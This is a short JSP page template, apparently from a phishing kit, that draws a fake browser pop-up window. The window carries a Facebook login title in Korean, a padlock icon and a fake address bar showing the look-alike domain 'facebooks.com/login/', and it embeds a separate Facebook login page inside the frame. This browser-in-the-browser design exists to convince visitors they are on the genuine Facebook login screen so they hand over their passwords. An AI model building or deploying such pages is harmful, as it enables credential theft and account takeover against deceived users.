<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>

<link rel="stylesheet" href="<c:url value="/resources/home/css/home.css" />">


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

<body>
<div id="window">
<!-- Title bar start -->
<div id="title-bar-width">
	<div id="title-bar">
		<div style="margin-top:5px;">
			<img src="<c:url value="/resources/home/img/logo.svg" />" width="20px" height="15px" id="logo">
			<span id="logo-description">Facebook - 로그인 또는 가입</span>
		</div>

		<div>
			<span id="minimize">&#8212;</span>
			<span id="square">□</span>
			<span id="exit">✕</span>
		</div>
	</div>
	<div id="url-bar">
		<img src="<c:url value="/resources/home/img/ssl.svg" />" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name">facebooks.com</span>
		<span id="domain-path">/login/</span>
	</div>
</div>
<!-- <div style="" id ="testdiv"> -->
	<jsp:include page="facebookLogin.jsp"></jsp:include>
<!-- </div> -->
<!-- Content start -->
<!-- http://localhost:8000/views/home/facebookLogin.jsp -->
<!-- <iframe id="content" src="facebookLogin.jsp" frameBorder="0"></iframe> -->

</div>
</body>


<script src="<c:url value="/resources/home/js/home.js" />"></script>